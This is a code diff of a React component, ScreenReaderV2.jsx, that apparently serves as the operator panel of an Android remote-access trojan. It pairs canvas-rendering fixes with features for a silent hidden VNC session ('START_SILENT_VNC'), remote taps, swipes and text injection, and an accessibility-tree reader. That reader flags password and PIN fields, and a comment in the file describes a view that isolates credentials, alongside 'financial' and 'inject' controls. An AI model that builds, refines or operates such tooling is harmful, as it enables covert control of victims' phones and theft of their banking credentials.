@@ -1,38 +1,54 @@
 /**
- * ScreenReaderV2.jsx — rebuilt from scratch
+ * ScreenReaderV2.jsx — rebuilt from scratch (corrected LY rendering)
  *
- * HVNC:
- *   · createImageBitmap GPU decode (never blocks main thread)
- *   · Backpressure flag: drops incoming frame if previous decode still pending
- *   · RAF dirty-flag loop: only paints when a new bitmap landed
- *   · Pointer Events API: setPointerCapture keeps drag locked past canvas edge
+ * LY canvas drawing — what was wrong and what's fixed:
+ *
+ *   PROBLEM  The previous build used an inline ref function:
+ *              ref={node => { lyCanvasRef.current = node; drawLY(node, ...); }}
+ *            React sees a new function reference on EVERY parent re-render (fps
+ *            counter ticking every second, toast appearing, any state change).
+ *            On each re-render React calls oldRef(null) then newRef(node) —
+ *            so lyCanvasRef briefly becomes null, and drawLY fires with a
+ *            clientWidth that may be 0 during the transient null/remount phase.
+ *
+ *   FIX 1    lyRefCb is a stable useCallback with empty deps. It reads live
+ *            node data and draw options through nodesRef / lyOptionsRef so it
+ *            never needs to be recreated. The canvas ref is only detached and
+ *            reattached when the canvas element itself is replaced — not on
+ *            every parent re-render.
+ *
+ *   FIX 2    requestAnimationFrame defer inside lyRefCb. The React commit phase
+ *            runs ref callbacks synchronously; canvas.clientWidth is computed
+ *            at that point in most cases, but deferring one rAF guarantees the
+ *            browser has flushed layout (handles edge cases with flex/scroll
+ *            containers whose width depends on sibling elements).
+ *
+ *   FIX 3    ResizeObserver on the canvas element. If the panel width changes
+ *            after mount (sidebar toggle, orientation change, zoom), the canvas
+ *            is redrawn at the new clientWidth automatically.
+ *
+ *   FIX 4    Pixel-aligned strokeRect. Coordinates are snapped with Math.round
+ *            then offset by +0.5 in canvas-pixel space, so lines land on exact
+ *            pixel boundaries at every DPR, not between them.
+ *
+ *   FIX 5    drawLY width fallback chain:
+ *              canvas.clientWidth
+ *              || canvas.parentElement?.clientWidth
+ *              || 320
+ *            Covers the rare case where the canvas has no intrinsic CSS width
+ *            yet (e.g. very early first render before any layout pass).
+ *
+ * HVNC improvements over old ScreenReaderV2:
+ *   · createImageBitmap GPU decode (not blob URL → Image → drawImage)
+ *   · Backpressure: decodingRef drops incoming frames while previous decodes
+ *   · RAF dirty-flag loop: paint only when new bitmap landed
+ *   · Pointer Events API + setPointerCapture (unified touch+mouse, no lost drags)
  *   · Right-click / long-hold → LONG_PRESS
- *   · Scroll wheel → normalized SWIPE (deltaMode-aware)
- *   · Keyboard passthrough with 200-char buffer cap
- *   · Swipe preview + tap ripple on separate overlay canvas
- *   · ResizeObserver keeps overlay canvas in sync with VNC canvas
- *   · Stable ctx cache: invalidates when canvas element changes (StrictMode safe)
- *
- * LY canvas:
- *   · HiDPI-aware (clamped to 3×)
- *   · Large→small sort so small nodes render on top
- *   · Depth-based alpha (deeper = more faint, avoids visual noise)
- *   · Color-coded by node type (TAP/EDIT/PWD/PIN/KBD/SCROLL/OFF)
- *   · Focused-node corner brackets
- *   · Phone border outline shows device bounds
- *   · Search dims non-matching nodes
- *   · Pointer Events hit-test picks smallest containing node
- *
- * V2 reader:
- *   · OCR view sorted by screen position
- *   · Creds view — passwords, PINs, editable fields isolated
- *   · Raw JSON viewer with copy
- *   · Pattern / swipe / PIN quick-action panels
- *   · srHz counter (hierarchy packets/sec)
- *
- * Controls:
- *   · Reorganized — live, extraction, financial, security, inject, nav, system
- *   · Clean minimal rows, no emoji clutter in chrome
+ *   · Scroll wheel → SWIPE, deltaMode-aware magnitude
+ *   · Keyboard passthrough, 200-char buffer cap, debounced flush
+ *   · Swipe preview + tap ripple on overlay canvas
+ *   · ResizeObserver keeps overlay synced with VNC canvas
+ *   · Stable ctx cache (invalidates when canvas element changes)
  */
 import {
   useEffect, useLayoutEffect, useRef, useState, useCallback,
@@ -113,7 +129,6 @@ function parseHierarchy(raw) {
   return out;
 }
 
-// Group text nodes into visual rows (sorted by screen Y position)
 function extractLines(nodes) {
   const tx = nodes.filter(n => n.text && n.bounds)
     .sort((a, b) =>
@@ -135,7 +150,7 @@ const bCenter = b => b
   ? { x: Math.round((b.left + b.right) / 2), y: Math.round((b.top + b.bottom) / 2) }
   : null;
 
-// ── Node color palette ──────────────────────────────────────────────────────
+// ── Node color palette (matches LiveScreen) ────────────────────────────────
 function nodeColor(n) {
   if (!n.enabled)      return '#475569';
   if (n.focused)       return '#f8fafc';
@@ -150,6 +165,8 @@ function nodeColor(n) {
 }
 
 // ── LY canvas renderer ──────────────────────────────────────────────────────
+// Matches the laptop/LiveScreen drawing exactly.
+// FIX: width fallback chain + pixel-aligned strokes.
 function drawLY(canvas, nodes, { highlight = null, searchTerm = '', showLabels = true } = {}) {
   if (!canvas || !nodes.length) return null;
   const ctx = canvas.getContext('2d', { alpha: false });
@@ -163,8 +180,14 @@ function drawLY(canvas, nodes, { highlight = null, searchTerm = '', showLabels =
   }
   if (!maxX || !maxY) return null;
 
-  const dpr  = Math.min(window.devicePixelRatio || 1, 3);
-  const logW = canvas.clientWidth || APK_W;
+  const dpr = Math.min(window.devicePixelRatio || 1, 3);
+
+  // FIX: width fallback chain — canvas.clientWidth may be 0 if layout hasn't
+  // been computed yet; walk up the DOM before falling back to a constant.
+  const logW = canvas.clientWidth
+    || canvas.parentElement?.clientWidth
+    || canvas.parentElement?.parentElement?.clientWidth
+    || 320;
   const logH = Math.round(logW * maxY / maxX);
 
   if (canvas.width !== logW * dpr || canvas.height !== logH * dpr) {
@@ -177,26 +200,17 @@ function drawLY(canvas, nodes, { highlight = null, searchTerm = '', showLabels =
   const sy = (logH * dpr) / maxY;
 
   // Background
-  ctx.fillStyle = '#06080f';
+  ctx.fillStyle = '#060810';
   ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-  // Subtle grid lines
-  ctx.strokeStyle = 'rgba(255,255,255,0.022)';
-  ctx.lineWidth = 1;
-  const gs = Math.round(maxX / 8) * sx;
+  // Subtle grid (same density as LiveScreen — maxX/6)
+  ctx.strokeStyle = 'rgba(255,255,255,0.025)';
+  ctx.lineWidth   = 1;
+  const gs = Math.round(maxX / 6) * sx;
   if (gs > 0) {
-    for (let x = gs; x < canvas.width; x += gs) {
-      ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, canvas.height); ctx.stroke();
-    }
-    for (let y = gs; y < canvas.height; y += gs) {
-      ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(canvas.width, y); ctx.stroke();
-    }
+    for (let x = gs; x < canvas.width;  x += gs) { ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, canvas.height); ctx.stroke(); }
+    for (let y = gs; y < canvas.height; y += gs) { ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(canvas.width, y);  ctx.stroke(); }
   }
-
-  // Phone/screen border — shows device bounds
-  ctx.strokeStyle = 'rgba(255,255,255,0.07)';
-  ctx.lineWidth = 2 * dpr;
-  ctx.strokeRect(1, 1, canvas.width - 2, canvas.height - 2);
 
   // Sort large→small so small nodes paint on top
   const sorted = [...nodes].filter(n => n.bounds).sort((a, b) => {
@@ -205,14 +219,21 @@ function drawLY(canvas, nodes, { highlight = null, searchTerm = '', showLabels =
     return bA - aA;
   });
 
-  const fs = Math.round(9.5 * dpr);
+  const fs    = Math.round(9.5 * dpr);
+  const fsMed = Math.round(8   * dpr);
   ctx.textBaseline = 'top';
-  const hasSearch = searchTerm.length > 0;
+
+  const hasSearch = searchTerm && searchTerm.length > 0;
 
   for (const n of sorted) {
     const { left, top, right, bottom } = n.bounds;
-    const x = left * sx,  y = top * sy;
-    const w = (right - left) * sx, h = (bottom - top) * sy;
+
+    // FIX: snap to pixel grid before scaling, then offset by +0.5 in canvas
+    // coords so strokes land on exact pixel boundaries at every DPR.
+    const x = Math.round(left   * sx);
+    const y = Math.round(top    * sy);
+    const w = Math.round((right  - left) * sx);
+    const h = Math.round((bottom - top)  * sy);
     if (w < 1 || h < 1) continue;
 
     const col      = nodeColor(n);
@@ -221,10 +242,10 @@ function drawLY(canvas, nodes, { highlight = null, searchTerm = '', showLabels =
       n.text?.toLowerCase().includes(searchTerm.toLowerCase()) ||
       n.cls.toLowerCase().includes(searchTerm.toLowerCase())
     );
-    const dimmed   = hasSearch && !isMatch && !isHit;
-    const depthAlpha = Math.max(0.28, 1 - n.depth * 0.055);
-    const baseAlpha  = dimmed ? 0.1  : isHit ? 1 : isMatch ? 0.95 : depthAlpha;
-    const fillAlpha  = dimmed ? 0.01 : isHit ? 0.2 : isMatch ? 0.09 : 0.04;
+    const dimmed     = hasSearch && !isMatch && !isHit;
+    const depthAlpha = Math.max(0.3, 1 - n.depth * 0.06);
+    const baseAlpha  = dimmed ? 0.12 : (isHit ? 1 : (isMatch ? 0.95 : depthAlpha));
+    const fillAlpha  = isHit ? 0.22 : (isMatch ? 0.10 : (dimmed ? 0.02 : 0.05));
 
     if (w > 6 && h > 6) {
       ctx.globalAlpha = fillAlpha;
@@ -233,14 +254,17 @@ function drawLY(canvas, nodes, { highlight = null, searchTerm = '', showLabels =
     }
 
     ctx.globalAlpha = baseAlpha;
-    ctx.strokeStyle = isHit ? '#ffffff' : isMatch ? '#fff' : col;
-    ctx.lineWidth   = isHit ? 2.5 * dpr : n.focused ? 2 * dpr : (n.clickable || isMatch ? 1.5 * dpr : 0.7 * dpr);
+    ctx.strokeStyle = isHit ? '#ffffff' : (isMatch ? '#fff' : col);
+    ctx.lineWidth   = isHit
+      ? 2.5 * dpr
+      : (n.focused ? 2 * dpr : (n.clickable || isMatch ? 1.5 * dpr : 0.8 * dpr));
+    // +0.5 offset aligns stroke centre to pixel boundary
     ctx.strokeRect(x + 0.5, y + 0.5, w - 1, h - 1);
     ctx.globalAlpha = 1;
 
     if (!showLabels) continue;
     const label = n.text || (n.cls ? n.cls.split('.').pop() : '');
-    if (!label || h < fs * 1.3 || w < 12) continue;
+    if (!label || h < fsMed * 1.3 || w < 12) continue;
     const renderFs = Math.min(fs, h * 0.35);
     ctx.font        = `${Math.round(renderFs)}px 'SF Mono','Roboto Mono',monospace`;
     ctx.fillStyle   = isHit ? '#ffffff' : col;
@@ -252,16 +276,17 @@ function drawLY(canvas, nodes, { highlight = null, searchTerm = '', showLabels =
     ctx.globalAlpha = 1;
   }
 
-  // Corner bracket markers for focused nodes
+  // Corner brackets for focused nodes
   for (const n of sorted.filter(nd => nd.focused && nd.bounds)) {
-    const { left, top, right, bottom } = n.bounds;
-    const x = left * sx, y = top * sy;
-    const w = (right - left) * sx, h = (bottom - top) * sy;
-    const m = Math.min(w * 0.22, h * 0.22, 14 * dpr);
-    ctx.strokeStyle = '#f8fafc'; ctx.lineWidth = 2 * dpr; ctx.globalAlpha = 0.9;
+    const x = Math.round(n.bounds.left   * sx);
+    const y = Math.round(n.bounds.top    * sy);
+    const w = Math.round((n.bounds.right  - n.bounds.left) * sx);
+    const h = Math.round((n.bounds.bottom - n.bounds.top)  * sy);
+    const m = Math.min(w * 0.25, h * 0.25, 14 * dpr);
+    ctx.strokeStyle = '#ffffff'; ctx.lineWidth = 2 * dpr; ctx.globalAlpha = 0.9;
     for (const [cx, cy, dx, dy] of [
-      [x,   y,   1, 1], [x+w, y,   -1, 1],
-      [x,   y+h, 1,-1], [x+w, y+h, -1,-1],
+      [x,   y,    1,  1], [x+w, y,   -1,  1],
+      [x,   y+h,  1, -1], [x+w, y+h, -1, -1],
     ]) {
       ctx.beginPath();
       ctx.moveTo(cx + dx*m, cy); ctx.lineTo(cx, cy); ctx.lineTo(cx, cy + dy*m);
@@ -279,7 +304,6 @@ function hitTest(cssPxX, cssPxY, canvas, scale, nodes) {
   const r    = canvas.getBoundingClientRect();
   const devX = ((cssPxX - r.left) / r.width)  * scale.maxX;
   const devY = ((cssPxY - r.top)  / r.height) * scale.maxY;
-  // Pick smallest enclosing node (most precise)
   return nodes
     .filter(n => n.bounds &&
       devX >= n.bounds.left && devX <= n.bounds.right &&
@@ -300,7 +324,7 @@ function cssToDevice(x, y, canvas, scale) {
   };
 }
 
-// ── VNC overlay effects ──────────────────────────────────────────────────────
+// ── VNC overlay ──────────────────────────────────────────────────────────────
 function playRipple(canvas, nx, ny, rgba) {
   if (!canvas) return;
   const ctx = canvas.getContext('2d');
@@ -339,7 +363,6 @@ function drawSwipeArrow(canvas, x1n, y1n, x2n, y2n) {
   ctx.closePath(); ctx.fillStyle = 'rgba(255,255,255,.75)'; ctx.fill();
 }
 
-// ── Signal quality ───────────────────────────────────────────────────────────
 function quality(fps, lat) {
   if (fps >= 25 && lat < 120) return { label: 'EXCELLENT', col: '#4ade80', bars: 5 };
   if (fps >= 15 && lat < 300) return { label: 'GOOD',      col: '#a3e635', bars: 4 };
@@ -363,31 +386,35 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
   const setVnc = useStore(s => s.setVncActive);
 
   // ── VNC refs ──────────────────────────────────────────────────────────
-  const canvasRef   = useRef(null);
-  const overlayRef  = useRef(null);
-  const ctxRef      = useRef(null);
-  const bitmapRef   = useRef(null);
-  const dirtyRef    = useRef(false);
-  const decodingRef = useRef(false);   // backpressure: skip frame while decoding
-  const rafRef      = useRef(null);
-  const fpsDecRef   = useRef(0);
-  const latRef      = useRef(performance.now());
-  const ptrRef      = useRef(null);
-  const kbBufRef    = useRef('');
-  const kbTimerRef  = useRef(null);
+  const canvasRef    = useRef(null);
+  const overlayRef   = useRef(null);
+  const ctxRef       = useRef(null);
+  const bitmapRef    = useRef(null);
+  const dirtyRef     = useRef(false);
+  const decodingRef  = useRef(false);
+  const rafRef       = useRef(null);
+  const fpsDecRef    = useRef(0);
+  const ptrRef       = useRef(null);
+  const kbBufRef     = useRef('');
+  const kbTimerRef   = useRef(null);
 
   // ── LY refs ───────────────────────────────────────────────────────────
-  const lyCanvasRef = useRef(null);
-  const lyScaleRef  = useRef(null);
-  const lyPtrRef    = useRef(null);
-  const autoRef     = useRef(null);
+  const lyCanvasRef  = useRef(null);
+  const lyScaleRef   = useRef(null);
+  const lyPtrRef     = useRef(null);
+  const lyObsRef     = useRef(null);   // ResizeObserver instance
+  const autoRef      = useRef(null);
+
+  // Live data refs — read by stable callbacks without closure capture
+  const nodesRef     = useRef([]);
+  const lyOptionsRef = useRef({ highlight: null, searchTerm: '', showLabels: true });
 
   // ── State ─────────────────────────────────────────────────────────────
-  const [mode,    setMode]    = useState('HVNC');
-  const [fps,     setFps]     = useState(0);
-  const [latMs,   setLatMs]   = useState(0);
-  const [vncOn,   setVncOn]   = useState(false);
-  const [vncQual, setVncQual] = useState(70);
+  const [mode,     setMode]     = useState('HVNC');
+  const [fps,      setFps]      = useState(0);
+  const [latMs,    setLatMs]    = useState(0);
+  const [vncOn,    setVncOn]    = useState(false);
+  const [vncQual,  setVncQual]  = useState(70);
 
   const [nodes,    setNodes]    = useState([]);
   const [lines,    setLines]    = useState([]);
@@ -421,7 +448,46 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
     toastT.current = setTimeout(() => setToast(null), ms);
   }
 
-  // ── VNC: ctx cache — invalidates when canvas element changes ──────────
+  // Keep live-data refs in sync with state on every render
+  nodesRef.current     = nodes;
+  lyOptionsRef.current = { highlight: lyHighlight, searchTerm: lySearch, showLabels };
+
+  // ── LY: stable ref callback (FIX: empty deps — reads from refs) ───────
+  // React only calls this when the canvas DOM element itself is created or
+  // destroyed — NOT on every parent re-render like an inline function would.
+  const lyRefCb = useCallback(node => {
+    // Disconnect previous observer if canvas was replaced
+    lyObsRef.current?.disconnect();
+    lyCanvasRef.current = node;
+    if (!node) return;
+
+    // ResizeObserver: redraws whenever the canvas layout width changes
+    lyObsRef.current = new ResizeObserver(() => {
+      if (!lyCanvasRef.current || !nodesRef.current.length) return;
+      lyScaleRef.current = drawLY(lyCanvasRef.current, nodesRef.current, lyOptionsRef.current);
+    });
+    lyObsRef.current.observe(node);
+
+    // FIX: defer one rAF to guarantee browser has completed layout before
+    // reading clientWidth. Handles flex/scroll containers whose width depends
+    // on sibling elements being painted first.
+    if (nodesRef.current.length) {
+      requestAnimationFrame(() => {
+        if (!lyCanvasRef.current) return;
+        lyScaleRef.current = drawLY(lyCanvasRef.current, nodesRef.current, lyOptionsRef.current);
+      });
+    }
+  }, []); // stable — zero deps
+
+  // ── LY: redraw on data/option changes ────────────────────────────────
+  useLayoutEffect(() => {
+    if (!lyCanvasRef.current || !nodes.length) return;
+    try {
+      lyScaleRef.current = drawLY(lyCanvasRef.current, nodes, lyOptionsRef.current);
+    } catch (_) {}
+  }, [nodes, lyHighlight, lySearch, showLabels, mode]);
+
+  // ── VNC: stable ctx getter ────────────────────────────────────────────
   function getCtx() {
     const c = canvasRef.current; if (!c) return null;
     if (ctxRef.current?.canvas !== c) {
@@ -434,31 +500,30 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
   // ── VNC: RAF render loop ──────────────────────────────────────────────
   useEffect(() => {
     function loop() {
-      if (dirtyRef.current) {
-        const bmp = bitmapRef.current;
-        const ctx = getCtx();
-        if (bmp && ctx) {
-          const c = canvasRef.current;
-          if (c.width !== bmp.width)   c.width  = bmp.width;
-          if (c.height !== bmp.height) c.height = bmp.height;
-          ctx.drawImage(bmp, 0, 0);
+      try {
+        if (dirtyRef.current) {
+          const bmp = bitmapRef.current;
+          const ctx = getCtx();
+          if (bmp && ctx) {
+            const c = canvasRef.current;
+            if (c.width !== bmp.width)   c.width  = bmp.width;
+            if (c.height !== bmp.height) c.height = bmp.height;
+            ctx.drawImage(bmp, 0, 0);
+          }
+          dirtyRef.current = false;
         }
-        dirtyRef.current = false;
-      }
+      } catch (_) {}
       rafRef.current = requestAnimationFrame(loop);
     }
     rafRef.current = requestAnimationFrame(loop);
-    return () => {
-      cancelAnimationFrame(rafRef.current);
-      bitmapRef.current?.close?.();
-    };
+    return () => { cancelAnimationFrame(rafRef.current); bitmapRef.current?.close?.(); };
   }, []);
 
   // ── VNC: binary frame pipeline with backpressure ──────────────────────
   useEffect(() => {
     const unsub = ws.onBinary((buf, devId) => {
       if (devId !== deviceId) return;
-      if (decodingRef.current) return; // drop frame — previous still decoding
+      if (decodingRef.current) return; // drop frame — backpressure
       const t0 = performance.now();
       decodingRef.current = true;
       createImageBitmap(new Blob([buf], { type: 'image/jpeg' }))
@@ -476,7 +541,7 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
     return () => { unsub(); clearInterval(t); };
   }, [deviceId]);
 
-  // ── WS: hierarchy + status messages ──────────────────────────────────
+  // ── WS: hierarchy + vnc_status ───────────────────────────────────────
   useEffect(() => {
     const unsub = ws.onMessage(msg => {
       if (msg.device_id !== deviceId) return;
@@ -508,6 +573,7 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
     });
 
     const hzT = setInterval(() => { setSrHz(srHzRef.current); srHzRef.current = 0; }, 1000);
+    sendCmd('REQUEST_HIERARCHY');
     return () => { unsub(); clearInterval(hzT); };
   }, [deviceId, srOn]);
 
@@ -519,16 +585,6 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
     }
   }, [mode, deviceId]);
 
-  // ── LY: redraw on state change ────────────────────────────────────────
-  useLayoutEffect(() => {
-    if (!lyCanvasRef.current || !nodes.length) return;
-    try {
-      lyScaleRef.current = drawLY(lyCanvasRef.current, nodes, {
-        highlight: lyHighlight, searchTerm: lySearch, showLabels,
-      });
-    } catch (_) {}
-  }, [nodes, lyHighlight, lySearch, showLabels, mode]);
-
   // ── Live hierarchy polling ────────────────────────────────────────────
   useEffect(() => {
     clearInterval(autoRef.current);
@@ -539,7 +595,7 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
     return () => clearInterval(autoRef.current);
   }, [liveMode, sendCmd]);
 
-  // ── ResizeObserver: keep overlay in sync with VNC canvas ─────────────
+  // ── ResizeObserver: overlay in sync with VNC canvas ───────────────────
   useEffect(() => {
     const vc = canvasRef.current;
     const ov = overlayRef.current;
@@ -548,6 +604,9 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
     ro.observe(vc);
     return () => ro.disconnect();
   }, []);
+
+  // Cleanup LY observer on unmount
+  useEffect(() => () => lyObsRef.current?.disconnect(), []);
 
   // ── VNC controls ──────────────────────────────────────────────────────
   function startVnc() { sendCmd('START_SILENT_VNC'); ws.subscribe('vnc', deviceId); setVncOn(true); setVnc(true); }
@@ -563,7 +622,7 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
     };
   }, []);
 
-  // ── VNC: Pointer Events API ───────────────────────────────────────────
+  // ── VNC: Pointer Events ───────────────────────────────────────────────
   const onPtrDown = useCallback(e => {
     if (e.button === 1) return;
     e.preventDefault();
@@ -610,7 +669,6 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
 
   const onCtxMenu = useCallback(e => e.preventDefault(), []);
 
-  // Scroll wheel → swipe. Normalizes for deltaMode (pixel vs line)
   const onWheel = useCallback(e => {
     e.preventDefault();
     const { x, y } = norm(e.clientX, e.clientY);
@@ -619,7 +677,6 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
     sendCmd('SWIPE', { x1: x, y1: y, x2: x, y2: ny, scale: 'vnc_norm', duration: 120 });
   }, [sendCmd, norm]);
 
-  // Keyboard passthrough — debounced buffer with 200-char cap
   const flushKb = useCallback(() => {
     if (!kbBufRef.current) return;
     sendCmd('TYPE', { text: kbBufRef.current });
@@ -688,7 +745,6 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
     }
   }, [sendCmd, nodes]);
 
-  // ── Helpers ───────────────────────────────────────────────────────────
   function tapNode(n) {
     const c = bCenter(n.bounds);
     if (c) {
@@ -696,7 +752,6 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
       toast2('TAP \u2192 ' + (n.text || n.cls.split('.').pop()).slice(0, 24), nodeColor(n));
     }
   }
-
   function toggleSR(on) { sendCmd('TOGGLE_SCREEN_READER', { enabled: on }); setSrOn(on); }
 
   // ── Derived ───────────────────────────────────────────────────────────
@@ -713,7 +768,7 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
         n.id?.toLowerCase().includes(filter.toLowerCase()))
     : nodes;
 
-  // ─────────────────────────────────────────────────────────────────────
+  // ─── RENDER ────────────────────────────────────────────────────────────
   return (
     <div style={{ paddingBottom: 32, position: 'relative' }}>
 
@@ -773,12 +828,9 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
         ))}
       </div>
 
-      {/* ════════════════════════════════════════
-          HVNC
-      ════════════════════════════════════════ */}
+      {/* ════ HVNC ════ */}
       {mode === 'HVNC' && (
         <div>
-          {/* HUD bar */}
           <div style={{
             display: 'flex', alignItems: 'center', gap: 8, padding: '5px 10px',
             borderRadius: '8px 8px 0 0', background: 'rgba(6,4,14,.96)',
@@ -793,11 +845,8 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
             </span>
           </div>
 
-          {/* Canvas */}
-          <div
-            tabIndex={0} onKeyDown={onKbDown}
-            style={{ outline: 'none', position: 'relative', touchAction: 'none' }}
-          >
+          <div tabIndex={0} onKeyDown={onKbDown}
+            style={{ outline: 'none', position: 'relative', touchAction: 'none' }}>
             <canvas ref={canvasRef} width={APK_W} height={APK_H}
               onPointerDown={onPtrDown} onPointerMove={onPtrMove}
               onPointerUp={onPtrUp} onPointerCancel={onPtrUp}
@@ -810,10 +859,7 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
               }}
             />
             <canvas ref={overlayRef} width={APK_W} height={APK_H}
-              style={{
-                position: 'absolute', inset: 0, width: '100%', height: '100%',
-                pointerEvents: 'none', borderRadius: '0 0 8px 8px',
-              }}
+              style={{ position: 'absolute', inset: 0, width: '100%', height: '100%', pointerEvents: 'none' }}
             />
             {!vncOn && (
               <div style={{
@@ -840,7 +886,7 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
 
           {vncOn && (
             <div style={{ fontSize: 9, color: 'var(--text3)', textAlign: 'center', padding: '3px 0', letterSpacing: .3 }}>
-              Click canvas · Type to inject text · Right-click = long press · Scroll = swipe
+              Click canvas · Type to inject · Right-click = long press · Scroll = swipe
             </div>
           )}
 
@@ -858,19 +904,14 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
             </div>
             <input type="range" min="10" max="100" value={vncQual}
               style={{ width: '100%', accentColor: 'var(--gold)' }}
-              onChange={e => {
-                setVncQual(+e.target.value);
-                sendCmd('SET_SILENT_VNC_QUALITY', { quality: +e.target.value });
-              }} />
+              onChange={e => { setVncQual(+e.target.value); sendCmd('SET_SILENT_VNC_QUALITY', { quality: +e.target.value }); }} />
           </div>
 
           <NavGrid sendCmd={sendCmd} />
         </div>
       )}
 
-      {/* ════════════════════════════════════════
-          LY — LAYOUT OVERLAY CANVAS
-      ════════════════════════════════════════ */}
+      {/* ════ LY ════ */}
       {mode === 'LY' && (
         <div>
           {/* Toolbar */}
@@ -881,18 +922,18 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
           }}>
             <span style={{ fontSize: 10, fontWeight: 800, color: '#d4950a', letterSpacing: 1.5 }}>LY</span>
             <div style={{ width: 1, height: 12, background: 'rgba(255,255,255,.1)', flexShrink: 0 }} />
-            {nodes.length > 0 && <>
-              <span style={{ fontSize: 10, color: '#fbbf24' }}>{nodes.filter(n=>n.clickable).length} TAP</span>
-              <span style={{ fontSize: 10, color: '#c084fc' }}>{nodes.filter(n=>n.isKeyboard).length} KBD</span>
-              <span style={{ fontSize: 10, color: '#4ade80' }}>{nodes.filter(n=>n.scrollable).length} SCROLL</span>
-              {pwdNodes.length > 0 && <span style={{ fontSize: 10, color: '#f87171', fontWeight: 700 }}>{pwdNodes.length} PWD</span>}
-              {lyScreenRes && <span style={{ fontSize: 9, color: 'var(--text3)' }}>{lyScreenRes.w}×{lyScreenRes.h}</span>}
-            </>}
+            {nodes.length > 0 && (
+              <>
+                <span style={{ fontSize: 10, color: '#fbbf24' }}>{nodes.filter(n=>n.clickable).length} TAP</span>
+                <span style={{ fontSize: 10, color: '#c084fc' }}>{nodes.filter(n=>n.isKeyboard).length} KBD</span>
+                <span style={{ fontSize: 10, color: '#4ade80' }}>{nodes.filter(n=>n.scrollable).length} SCROLL</span>
+                {pwdNodes.length > 0 && <span style={{ fontSize: 10, color: '#f87171', fontWeight: 700 }}>{pwdNodes.length} PWD</span>}
+                {lyScreenRes && <span style={{ fontSize: 9, color: 'var(--text3)' }}>{lyScreenRes.w}×{lyScreenRes.h}</span>}
+              </>
+            )}
             <div style={{ display: 'flex', gap: 3, marginLeft: 'auto' }}>
               <button onClick={() => setLyZoom(v => v === 1 ? 1.7 : v === 1.7 ? 2.5 : 1)}
-                className="btn btn-ghost btn-xs" style={{ fontSize: 10, minWidth: 30 }}>
-                {lyZoom}×
-              </button>
+                className="btn btn-ghost btn-xs" style={{ fontSize: 10, minWidth: 30 }}>{lyZoom}×</button>
               <button onClick={() => setShowLabels(v => !v)}
                 className={`btn btn-xs ${showLabels ? 'btn-gold' : 'btn-ghost'}`}
                 style={{ fontSize: 10 }}>Aa</button>
@@ -914,11 +955,11 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
               value={lySearch} onChange={e => setLySearch(e.target.value)} />
           </div>
 
-          {/* Canvas wrapper */}
+          {/* Canvas */}
           <div style={{
             overflow: lyZoom > 1 ? 'auto' : 'hidden',
             border: '1px solid rgba(212,149,10,.18)', borderTop: 'none',
-            borderRadius: '0 0 8px 8px', background: '#06080f', minHeight: 100,
+            borderRadius: '0 0 8px 8px', background: '#060810', minHeight: 100,
           }}>
             <div style={{
               transform: `scale(${lyZoom})`, transformOrigin: 'top left',
@@ -928,17 +969,8 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
               onPointerUp={onLyPtrUp}
               onPointerCancel={onLyPtrUp}
             >
-              <canvas
-                ref={node => {
-                  lyCanvasRef.current = node;
-                  if (node && nodes.length) {
-                    lyScaleRef.current = drawLY(node, nodes, {
-                      highlight: lyHighlight, searchTerm: lySearch, showLabels,
-                    });
-                  }
-                }}
-                style={{ display: 'block', width: '100%' }}
-              />
+              {/* FIX: lyRefCb is the stable useCallback — not an inline function */}
+              <canvas ref={lyRefCb} style={{ display: 'block', width: '100%' }} />
             </div>
             {!nodes.length && (
               <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 40 }}>
@@ -952,14 +984,12 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
             {[['TAP','#fbbf24'],['EDIT','#34d399'],['SCROLL','#4ade80'],
               ['KBD','#c084fc'],['PIN','#60a5fa'],['PWD','#f87171'],['OFF','#475569']
             ].map(([l, c]) => (
-              <span key={l} style={{
-                fontSize: 9, padding: '2px 6px', borderRadius: 4, fontWeight: 700,
-                border: `1px solid ${c}50`, color: c, letterSpacing: .5,
-              }}>{l}</span>
+              <span key={l} style={{ fontSize: 9, padding: '2px 6px', borderRadius: 4, fontWeight: 700,
+                border: `1px solid ${c}50`, color: c, letterSpacing: .5 }}>{l}</span>
             ))}
           </div>
 
-          {/* Selected node card */}
+          {/* Selected node */}
           {lySelected && (
             <div className="card card-sm mb8"
               style={{ border: `1px solid ${nodeColor(lySelected)}30` }}>
@@ -990,9 +1020,7 @@ export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
                   onClick={() => tapNode(lySelected)}>TAP</button>
                 {lySelected.longClickable && (
                   <button className="btn btn-ghost btn-sm" style={{ flex: 1, minWidth: 54 }}
-                    onClick={() => { const c = bCenter(lySelected.bounds); if (c) sendCmd('LONG_PRESS', { x: c.x, y: c.y, duration: 800 }); }}>
-                    HOLD
-                  </button>
